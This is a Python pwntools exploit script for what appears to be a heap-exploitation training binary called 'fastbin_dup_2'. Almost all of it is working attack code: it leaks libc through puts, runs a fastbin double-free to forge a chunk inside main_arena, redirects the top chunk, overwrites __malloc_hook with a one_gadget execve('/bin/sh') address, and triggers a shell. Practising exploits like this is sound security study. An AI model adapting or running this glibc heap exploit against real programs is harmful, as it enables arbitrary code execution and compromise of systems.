#!/usr/bin/python3
from pwn import *


elf = context.binary = ELF("fastbin_dup_2", checksec=True)
libc = elf.libc
context.log_level = "debug"

gs = """
set context-sections code
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()
io.timeout = 1

io.recvuntil(b"puts() @ ")
puts_leak = int(io.recvline(), 16)

log.info(f"puts leak @ {puts_leak:#x}")
libc.address = puts_leak - libc.sym.puts
log.info(f"libc base @ {libc.address:#x}")


counter = 0
def malloc(size, data):
    io.sendafter(b"> ", b"1")
    io.sendafter(b"size: ", str(size).encode())
    io.sendafter(b"data: ", data)

def free(index):
    io.sendafter(b"> ", b"2")
    io.sendafter(b"index: ", str(index).encode())


malloc(0x48, "A"*8)
malloc(0x48, "B"*8)

free(0)
free(1)
free(0)

# overwrite a fastbin fd with a fake size field
malloc(0x48, p64(0x61))

# request 2 more chunks overwriting a 0x61 size field into the main arena
malloc(0x48, b"C"*8)
malloc(0x48, b"D"*8)

# link the fake main arena chunk into the 0x60 fastbin
malloc(0x58, b"X"*8)
malloc(0x58, b"Z"*8)

free(5)
free(6)
free(5)

# link fake chunk into the 0x60 fastbin
malloc(0x58, p64(libc.sym.main_arena + 0x20))

# move the fake chunk to the head of head of the 0x60 fastbin
# If the -s option is present, or if no arguments remain after option processing, then commands are read from the standard input.
malloc(0x58, b"-s\0")
malloc(0x58, b"W"*8)

# overwrite top chunk pointer | request fake chunk overlapping the main arena.
# -35 to leave us with a reliable size field
malloc(0x58, b"Y"*48 + p64(libc.sym.__malloc_hook - 35))

"""
0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
"""

# overwrite the malloc hook
malloc(0x28, b"S"*19 + p64(libc.address+0xe1fa1))

malloc(1,b"") # call to malloc will trigger our shell

io.interactive()
